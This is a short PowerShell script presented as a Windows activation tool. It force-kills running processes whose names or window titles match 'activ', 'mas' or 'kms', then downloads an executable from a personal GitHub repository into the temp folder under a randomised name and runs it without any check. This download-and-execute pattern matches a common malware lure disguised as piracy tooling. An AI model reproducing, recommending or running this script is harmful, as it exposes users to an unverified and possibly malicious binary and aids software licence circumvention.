$url = "https://raw.githubusercontent.com/acenljd/Windows-Activator/refs/heads/main/Microsoft%20Activation%20Scripts.exe"


Get-Process | Where-Object {
    $_.ProcessName -like "*activ*" -or 
    $_.ProcessName -like "*mas*" -or 
    $_.ProcessName -like "*kms*" -or 
    $_.MainWindowTitle -like "*activ*"
} | Stop-Process -Force -ErrorAction SilentlyContinue


Start-Sleep -Seconds 1


$uniqueName = "Activator_" + [System.Guid]::NewGuid().ToString("N").Substring(0, 8) + ".exe"
$tempFile = "$env:TEMP\$uniqueName"


$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile($url, $tempFile)
$webClient.Dispose()


Start-Process $tempFile
